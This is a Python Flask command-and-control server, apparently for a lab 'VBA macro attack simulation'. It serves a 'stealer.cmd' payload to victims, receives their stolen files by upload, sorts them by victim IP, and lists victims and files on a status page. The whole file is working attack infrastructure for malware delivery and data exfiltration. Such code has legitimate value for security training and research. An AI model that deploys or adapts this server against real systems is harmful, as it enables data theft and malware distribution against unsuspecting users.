"""
Command & Control (C2) Server
Flask-based server for the VBA macro attack simulation.

Features:
- GET /download: Serves the stealer.cmd file to victims
- POST /upload: Receives stolen files from victims

Usage:
    python c2_server.py [--host HOST] [--port PORT]
    
Default: http://192.168.174.131:4444
"""

from flask import Flask, request, send_from_directory, jsonify
import os
import argparse
from datetime import datetime

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'
STEALER_FILE = 'stealer.cmd'

# Create uploads directory if it doesn't exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


@app.route('/')
def index():
    """Health check endpoint."""
    return jsonify({
        'status': 'online',
        'message': 'C2 Server is running',
        'endpoints': {
            '/download': 'GET - Download stealer.cmd',
            '/upload': 'POST - Upload stolen files'
        }
    })


@app.route('/download', methods=['GET'])
def download_file():
    """
    Serve the stealer.cmd file to victims.
    The VBA macro calls this endpoint to download the information stealer.
    """
    try:
        client_ip = request.remote_addr
        print(f"[{datetime.now()}] [DOWNLOAD] Client {client_ip} requested stealer.cmd")
        return send_from_directory(".", STEALER_FILE, as_attachment=True)
    except FileNotFoundError:
        return jsonify({'error': 'Stealer file not found'}), 404


@app.route('/upload', methods=['POST'])
def upload_file():
    """
    Receive stolen files from victims.
    The stealer.cmd script uses curl to POST files to this endpoint.
    """
    client_ip = request.remote_addr
    
    if 'file' not in request.files:
        print(f"[{datetime.now()}] [UPLOAD] Client {client_ip} - No file part in request")
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    
    if file.filename == '':
        print(f"[{datetime.now()}] [UPLOAD] Client {client_ip} - No selected file")
        return jsonify({'error': 'No selected file'}), 400
    
    # Create subdirectory for each victim IP
    victim_folder = os.path.join(UPLOAD_FOLDER, client_ip.replace(':', '_'))
    os.makedirs(victim_folder, exist_ok=True)
    
    # Add timestamp to avoid overwriting files with same name
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{timestamp}_{file.filename}"
    filepath = os.path.join(victim_folder, filename)
    
    file.save(filepath)
    
    print(f"[{datetime.now()}] [UPLOAD] Client {client_ip} - Received: {file.filename}")
    print(f"[{datetime.now()}] [UPLOAD] Saved to: {filepath}")
    
    return jsonify({
        'message': 'File uploaded successfully',
        'filename': filename
    }), 200


@app.route('/status', methods=['GET'])
def status():
    """Show server status and received files."""
    files_received = []
    
    for victim_ip in os.listdir(UPLOAD_FOLDER):
        victim_folder = os.path.join(UPLOAD_FOLDER, victim_ip)
        if os.path.isdir(victim_folder):
            victim_files = os.listdir(victim_folder)
            files_received.append({
                'victim_ip': victim_ip.replace('_', ':'),
                'files_count': len(victim_files),
                'files': victim_files
            })
    
    return jsonify({
        'status': 'online',
        'victims_count': len(files_received),
        'victims': files_received
    })


def main():
    parser = argparse.ArgumentParser(description='C2 Server for VBA Macro Attack')
    parser.add_argument('--host', default='192.168.174.131', help='Server host (default: 192.168.174.131)')
    parser.add_argument('--port', type=int, default=4444, help='Server port (default: 4444)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("C2 Server - VBA Macro Attack Simulation")
    print("=" * 60)
    print(f"[*] Starting server on http://{args.host}:{args.port}")
    print(f"[*] Upload folder: {os.path.abspath(UPLOAD_FOLDER)}")
    print(f"[*] Stealer file: {os.path.abspath(STEALER_FILE)}")
    print("=" * 60)
    print("[*] Endpoints:")
    print(f"    GET  /download - Serve stealer.cmd")
    print(f"    POST /upload   - Receive stolen files")
    print(f"    GET  /status   - View received files")
    print("=" * 60)
    
    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == '__main__':
    main()
